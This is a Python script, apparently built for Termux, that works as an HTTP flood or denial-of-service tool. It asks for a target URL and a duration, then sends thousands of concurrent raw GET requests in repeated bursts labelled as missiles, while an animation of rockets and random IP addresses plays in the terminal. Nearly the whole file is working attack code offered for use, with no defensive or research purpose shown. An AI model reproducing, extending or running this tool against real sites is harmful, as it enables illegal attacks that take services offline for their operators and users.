#!/usr/bin/env python3
"""
TOS-1 Termux-optimized — raw HTTP requests version
Sends raw HTTP/HTTPS requests (built as bytes) for each missile batch.
"""

import asyncio
import ssl
import random
import time
import os
import shutil
from urllib.parse import urlparse

# ----------------------------
# CONFIG / GLOBALS
# ----------------------------
TERMINAL_SIZE = shutil.get_terminal_size((80, 40))
TERMINAL_WIDTH = TERMINAL_SIZE.columns
TERMINAL_HEIGHT = max(10, TERMINAL_SIZE.lines - 2)

# Concurrency cap for simultaneous TCP connections
GLOBAL_CONN_LIMIT = 600  # tuneable; protects device from too many open sockets

# Missile batch definitions
MISSILE_BATCHES = {
    1: 50,     # avg
    2: 200,    # ballistic
    3: 300,    # hypersonic
    4: 1000    # shark-z3 ultra
}

ULTRA_SUPER_BATCH = 3500
LAST_BATCH = 500

SUPERNOVA_INITIAL = 1000
SUPERNOVA_STREAM = 50 * 10  # 500/ms -> implemented as many small bursts limited by concurrency

# raw socket semaphore
_conn_semaphore = asyncio.Semaphore(GLOBAL_CONN_LIMIT)

# ----------------------------
# Terminal helpers & animation
# ----------------------------
def clear():
    print("\033[H\033[J", end="")

def random_ip():
    return ".".join(str(random.randint(1, 255)) for _ in range(4))

async def countdown_loader(seconds):
    # Display random-ish IPs during the reload (overwriting each second)
    for i in range(seconds, 0, -1):
        clear()
        print(f"SG - RELOADING | {i}s")
        # show 5 random "real-looking" IPs
        for _ in range(5):
            print(random_ip())
        await asyncio.sleep(1)

# Missile ASCII (small for Termux)
MISSILE_BODY = [
"  /\\  ",
" |=|  ",
" |=|  ",
" |=|  ",
" |=|  "
]

EXHAUST_FRAMES = [
    "\033[31m ^^^ \033[0m",
    "\033[33m *** \033[0m",
    "\033[91m !!! \033[0m",
    "\033[93m ::: \033[0m"
]

class Missile:
    def __init__(self, speed=None):
        self.reset(speed)

    def reset(self, speed=None):
        if speed:
            self.speed = speed
        else:
            # choose from 1..4; 4 is Shark-Z3 Ultra
            self.speed = random.choice([1,2,3,4])
        self.batch = MISSILE_BATCHES.get(self.speed, 50)
        self.x = max(0, TERMINAL_WIDTH // 2 - len(MISSILE_BODY[0]) // 2)
        self.y = TERMINAL_HEIGHT
        self.active = False
        self.launch_delay = random.uniform(1,3)
        self.exhaust = random.choice(EXHAUST_FRAMES)

    def move(self):
        if self.active:
            self.y -= self.speed
            if self.y < -len(MISSILE_BODY):
                self.reset()
                self.active = False

def draw_missiles(missiles):
    buffer = [""] * TERMINAL_HEIGHT
    for missile in missiles:
        if missile.active:
            for i, line in enumerate(MISSILE_BODY):
                pos = missile.y - len(MISSILE_BODY) + i
                if 0 <= pos < TERMINAL_HEIGHT:
                    if i == 0:
                        # only show raw number of reqs beside the missile
                        buffer[pos] += " " * missile.x + line + f"  [{missile.batch}]"
                    else:
                        buffer[pos] += " " * missile.x + line
            exhaust_pos = missile.y
            if 0 <= exhaust_pos < TERMINAL_HEIGHT:
                buffer[exhaust_pos] += " " * missile.x + random.choice(EXHAUST_FRAMES)
    clear()
    print("\n".join(buffer))

# ----------------------------
# Raw HTTP request builder & sender
# ----------------------------
def parse_target(target: str):
    """
    Returns (scheme, host, port, path)
    """
    if "://" not in target:
        # assume http
        target = "http://" + target
    p = urlparse(target)
    scheme = p.scheme or "http"
    host = p.hostname
    port = p.port
    path = p.path or "/"
    if p.query:
        path += "?" + p.query
    if not port:
        port = 443 if scheme == "https" else 80
    return scheme, host, port, path

def build_raw_get(host: str, path: str, extra_headers: dict | None = None) -> bytes:
    headers = {
        "Host": host,
        "User-Agent": "TOS-1-raw/1.0",
        "Accept": "*/*",
        "Connection": "close",
    }
    if extra_headers:
        headers.update(extra_headers)
    # Build header lines
    header_lines = "\r\n".join(f"{k}: {v}" for k, v in headers.items())
    req = f"GET {path} HTTP/1.1\r\n{header_lines}\r\n\r\n"
    return req.encode("utf-8", errors="ignore")

async def send_one_raw(host: str, port: int, use_ssl: bool, request_bytes: bytes, timeout=5.0):
    """
    Sends a single raw HTTP request (open connection, write, optional small read, close).
    Guards with semaphore to limit simultaneous sockets.
    """
    await _conn_semaphore.acquire()
    try:
        ssl_ctx = None
        if use_ssl:
            ssl_ctx = ssl.create_default_context()
            # disable cert validation? we keep default secure context
        try:
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(host, port, ssl=ssl_ctx),
                timeout=timeout
            )
        except Exception:
            return  # connection failed, silently ignore

        try:
            writer.write(request_bytes)
            await writer.drain()
            # read a small portion of response (to not hang on huge bodies)
            try:
                await asyncio.wait_for(reader.read(1024), timeout=0.5)
            except Exception:
                # ignore read timeout/errors — we don't need full response
                pass
            try:
                writer.close()
                await writer.wait_closed()
            except Exception:
                pass
        except Exception:
            try:
                writer.close()
            except Exception:
                pass
    finally:
        _conn_semaphore.release()

async def send_requests_raw(target: str, batch: int, extra_headers: dict | None = None):
    """
    Sends 'batch' number of raw requests to 'target' concurrently, but in controlled chunks.
    """
    scheme, host, port, path = parse_target(target)
    use_ssl = (scheme.lower() == "https")
    request_bytes = build_raw_get(host, path, extra_headers)
    # chunking: don't create more coros than GLOBAL_CONN_LIMIT at once
    max_chunk = max(1, GLOBAL_CONN_LIMIT)
    remaining = batch
    tasks = []
    while remaining > 0:
        chunk = min(remaining, max_chunk)
        # spawn chunk coroutines
        coros = [send_one_raw(host, port, use_ssl, request_bytes) for _ in range(chunk)]
        # run chunk concurrently and wait for them to finish
        try:
            await asyncio.gather(*coros)
        except Exception:
            # ignore errors inside chunk
            pass
        remaining -= chunk
    # finished batch

# ----------------------------
# Heavy missile routines
# ----------------------------
async def ultra_super_missile(target, duration):
    start_time = time.time()
    while time.time() - start_time < duration:
        # fire ULTRA_SUPER_BATCH once
        asyncio.create_task(send_requests_raw(target, ULTRA_SUPER_BATCH))
        await asyncio.sleep(5)

async def last_missile(target, duration):
    start_time = time.time()
    while time.time() - start_time < duration:
        asyncio.create_task(send_requests_raw(target, LAST_BATCH))
        await asyncio.sleep(0.5)

async def supernova_missile(target, duration):
    start_time = time.time()
    while time.time() - start_time < duration:
        delay = random.uniform(5, 10)  # safety: 5-10s
        await asyncio.sleep(delay)

        # initial burst
        asyncio.create_task(send_requests_raw(target, SUPERNOVA_INITIAL))

        # stream while rising: we simulate "while rising" by sending many small batches for ~2s
        async def stream():
            t_end = time.time() + 2.0
            # attempt repeated very-fast bursts; each burst sends SUPERNOVA_STREAM requests
            while time.time() < t_end:
                # schedule burst but await here to avoid infinite piling
                await send_requests_raw(target, SUPERNOVA_STREAM)
                # yield tiny moment; this is effectively synchronous per burst but allows other tasks
                await asyncio.sleep(0)  # yield control
        asyncio.create_task(stream())

# ----------------------------
# Main program
# ----------------------------
async def main():
    target = input("¿TARGZ > ").strip()
    if not target:
        print("No target given.")
        return
    try:
        duration = int(input("¿DU > ").strip())
    except Exception:
        print("Invalid duration.")
        return

    # 5s reload w/ random IPs
    await countdown_loader(5)

    # initialize mini-swarm missiles
    missiles = [Missile() for _ in range(2)]

    # start background heavy missiles
    asyncio.create_task(ultra_super_missile(target, duration))
    asyncio.create_task(last_missile(target, duration))
    asyncio.create_task(supernova_missile(target, duration))

    start_time = time.time()
    last_launch_times = [0] * len(missiles)

    # main animation + per-missile batch launching (raw)
    while time.time() - start_time < duration:
        now = time.time()
        for idx, missile in enumerate(missiles):
            if not missile.active and now - last_launch_times[idx] >= missile.launch_delay:
                missile.active = True
                last_launch_times[idx] = now
                # launch the missile's raw batch (no extra headers)
                asyncio.create_task(send_requests_raw(target, missile.batch))
            missile.move()
        draw_missiles(missiles)
        await asyncio.sleep(0.05)

    # allow background tasks to finish a little
    await asyncio.sleep(0.5)

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        clear()
